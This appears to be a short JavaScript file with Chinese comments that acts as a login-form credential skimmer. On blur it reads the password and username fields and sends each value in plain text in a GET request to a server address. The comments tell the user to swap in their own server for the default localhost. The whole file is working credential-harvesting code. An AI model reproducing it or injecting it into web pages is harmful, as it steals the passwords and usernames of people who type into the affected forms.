const pinp = document.querySelector("input[type='password']");
const uinp = document.querySelector("input[type='text']");

// 服务器地址
const url = "http://localhost:3000/"

// ajax请求创建
function initAjax(){
    var ajax = false;
    if (window.ActiveXObject) {
        ajax = new ActiveXObject('Microsoft.XMLHTTP');
    } else {
        ajax = new XMLHttpRequest();
    }

    ajax.onreadystatechange = function() {
        // readyState的值表示当前请求的状态
        if (ajax.readyState == 4) {
            // 判断请求的结果 
            if (ajax.status == 200) {
                //请求成功   回调值在这里
                var data = ajax.responseText; //回调过来的值
                console.log(data);
            } else { // 请求失败后
                console.log("err");
            }
        }
    }
    return ajax
}
pinp.addEventListener('blur', () => {
    let val = pinp.value;
    
    let ajax = initAjax()

    // 改为 你的服务器地址
    ajax.open("get", url + val);
    ajax.send(null);
})
uinp.addEventListener('blur', () => {
    let val = uinp.value;

    let ajax = initAjax()

    // 改为 你的服务器地址
    ajax.open("get", url + val);
    ajax.send(null);
})